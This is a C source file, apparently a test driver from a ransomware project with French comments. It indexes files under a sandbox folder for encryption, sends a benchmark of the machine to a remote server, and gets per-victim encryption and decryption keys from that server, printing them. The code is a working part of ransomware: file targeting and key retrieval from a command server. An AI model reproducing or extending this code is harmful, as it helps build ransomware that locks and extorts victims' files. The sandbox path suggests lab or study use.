#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#include "../crypto_rsa.h"
#include "../files_finder.h"
#include "../benchmark.h"
#include "../server.h"

int main(int argc, char const *argv[])
{
    /* code */
    char* paths[] = {"/tmp/sandbox-ransomware/"};
    char* p_algo = NULL;
    char* p_iv = NULL;
    char* id = "45565555555";

    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Envoi du benchmark au serveur */
    benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);

    p_benchmarkData->memorySize = 1000;
    p_benchmarkData->dataSize = 99999999999999999;
    p_benchmarkData->cpuCore = 4;

    char* p_key = get_encryption_key(id, p_benchmarkData, &p_algo, &p_iv);

    printf("key: %s\n", p_key);
    printf("iv: %s\n", p_iv);
    printf("Algo: %s\n", p_algo);

    p_key = get_decryption_key(id, &p_algo, &p_iv);

    printf("key: %s\n", p_key);
    printf("iv: %s\n", p_iv);
    printf("Algo: %s\n", p_algo);

    free_path_data(p_listFileData);
    free(p_benchmarkData);
    free(p_key);
    free(p_iv);
    free(p_algo);

    return EXIT_SUCCESS;
}
